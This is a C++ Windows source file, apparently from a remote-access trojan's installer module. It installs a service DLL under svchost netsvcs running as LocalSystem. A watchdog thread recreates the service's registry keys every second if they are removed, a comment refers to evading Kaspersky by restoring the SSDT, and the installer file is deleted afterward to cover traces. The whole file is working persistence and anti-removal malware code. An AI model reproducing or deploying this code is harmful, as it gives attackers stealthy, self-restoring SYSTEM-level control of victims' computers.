#include "install.h"
#include "until.h"

void RemoveService(LPCTSTR lpServiceName)
{
	char		Desc[MAX_PATH];
	SC_HANDLE	service = NULL, scm = NULL;
	SERVICE_STATUS	Status;
	__try
	{
		scm = OpenSCManager(0, 0,
			SC_MANAGER_CREATE_SERVICE);
		service = OpenService(
			scm, lpServiceName,
			SERVICE_ALL_ACCESS | DELETE);
		if (scm==NULL&&service == NULL)
			__leave;
		
		if (!QueryServiceStatus(service, &Status))
			__leave;
		
		if (Status.dwCurrentState != SERVICE_STOPPED)
		{
			if (!ControlService(service,
				SERVICE_CONTROL_STOP, 
				&Status))
				__leave;
			Sleep(800);
		}
		DeleteService(service);
	}
	__finally
	{
		if (service != NULL)
			CloseServiceHandle(service);
		if (scm != NULL)
			CloseServiceHandle(scm);
	}
	return;
}


int RecoverService(char *lpServiceName)
{
    int rc = 0;
    HKEY hKey = 0;
	
    try{
        char buff[500];
		char subkey[500];
		char lpServiceDll[MAX_PATH];
		GetSystemDirectory(lpServiceDll, sizeof(lpServiceDll));
		lstrcat(lpServiceDll, "\\");
		lstrcat(lpServiceDll, lpServiceName);
		lstrcat(lpServiceDll, "ex.dll");
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        if(ERROR_SUCCESS != rc)
        {
            throw "";
        }
		
		rc = RegSetValueEx(hKey, "DisplayName", 0, REG_SZ, (unsigned char*)lpServiceName, strlen(lpServiceName)+1);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(ServiceDll)";
		
		char *lpImagePath = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
		rc = RegSetValueEx(hKey, "ImagePath", 0, REG_EXPAND_SZ, (unsigned char*)lpImagePath, strlen(lpImagePath)+1);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(ServiceDll)";
		
		char *lpObjectName = "LocalSystem";
		rc = RegSetValueEx(hKey, "ObjectName", 0, REG_SZ, (unsigned char*)lpObjectName, strlen(lpObjectName)+1);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(ServiceDll)";
		
		DWORD dwErrorControl = 1;
        rc = RegSetValueEx(hKey, "ErrorControl", 0, REG_DWORD, (unsigned char*)&dwErrorControl, sizeof(DWORD));
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(start)";
		
		DWORD dwType = 0x120;
        rc = RegSetValueEx(hKey, "Type", 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(start)";
		
        DWORD dwValue = 2;
        rc = RegSetValueEx(hKey, "Start", 0, REG_DWORD, (unsigned char*)&dwValue, sizeof(DWORD));
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(start)";
		
        ////////////////////
		RegCloseKey(hKey);
		lstrcpy(subkey, buff);
        strcat(subkey, "\\Parameters");
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, subkey, &hKey);
        if(ERROR_SUCCESS != rc)
        {
            //printf("RegOpenKeyEx(%s) KEY_SET_VALUE error %d.", lpServiceName, rc); 
            throw "";
        }
		
		DWORD dwServiceDllUnloadOnStop = 0;
		
        rc = RegSetValueEx(hKey, "ServiceDllUnloadOnStop", 0, REG_DWORD, (unsigned char*)&dwServiceDllUnloadOnStop, sizeof(DWORD));
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(start)";
		
        rc = RegSetValueEx(hKey, "ServiceDll", 0, REG_EXPAND_SZ, (unsigned char*)lpServiceDll, strlen(lpServiceDll)+1);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(ServiceDll)";
    }
    catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
	
    RegCloseKey(hKey);
    return 0;
}

DWORD QueryServiceTypeFromRegedit(char *lpServiceName)
{
	int rc = 0;
    HKEY hKey = 0;
	DWORD	dwServiceType = 0;
    try{
        char buff[500];
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegOpenKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        if(ERROR_SUCCESS != rc)
        {
            throw "";
        }
		
		DWORD type, size = sizeof(DWORD);
		rc = RegQueryValueEx(hKey, "Type", 0, &type, (unsigned char *)&dwServiceType, &size);
		RegCloseKey(hKey);
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Type)";
    }
    catch(...)
    {
    }
	
    RegCloseKey(hKey);
    return dwServiceType;
}

bool IsServiceRegExists(char *lpServiceName)
{
	HKEY hKey = NULL;
	int rc = 0;
	char buff[500];
	wsprintf(buff, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_QUERY_VALUE, &hKey);
	RegCloseKey(hKey);

	return rc == ERROR_SUCCESS;
}

DWORD WINAPI MonitorReg(LPVOID lparam)
{
	char	strServiceName[MAX_PATH];
	lstrcpy(strServiceName, (char *)lparam);

	while (1)
	{
		Sleep(1000);
		if (!IsServiceRegExists(strServiceName))
			RecoverService(strServiceName);
	}
}
void ReInstallService(char *lpServiceName)
{
	DeleteInstallFile();
	if (QueryServiceTypeFromRegedit(lpServiceName) == 0x120)
	{
		RemoveService(lpServiceName);
		
		// 等系统删除服务后删除注册表项
		while (IsServiceRegExists(lpServiceName))
			Sleep(1000);
		// 重启后，卡巴会监视，所以要每次运行都恢复SSDT
	}
	RecoverService(lpServiceName);
}

bool GetServiceDllPath(char *lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	HKEY hkRoot = HKEY_LOCAL_MACHINE;
	int rc = 0;
	char temp[500];
	wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", lpServiceName);
	rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
	if (rc != ERROR_SUCCESS)
        return false;

    DWORD type, size = uSize;
    rc = RegQueryValueEx(hkRoot, "ServiceDll", 0, &type, (unsigned char*)lpBuffer, &size);
	if (rc != ERROR_SUCCESS)
        return false;

    RegCloseKey(hkRoot);
	return true;
}

void DeleteInstallFile()
{
	// 等安装进程退出
	Sleep(1000);
	char	strSysLog[MAX_PATH];
	GetSystemDirectory(strSysLog, sizeof(strSysLog));
	lstrcat(strSysLog, "\\install.tmp");
	HANDLE	hFile = CreateFile(strSysLog, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD	dwBytesRead = 0;
		DWORD	dwFileSize = GetFileSize(hFile, NULL);
		char	*lpInstallFile = new char[dwFileSize + 1];
		ReadFile(hFile, lpInstallFile, dwFileSize, &dwBytesRead, NULL);
		lpInstallFile[dwFileSize] = '\0';
		DeleteFile(lpInstallFile);
		delete [] lpInstallFile;
	}
	CloseHandle(hFile);
	DeleteFile(strSysLog);
}
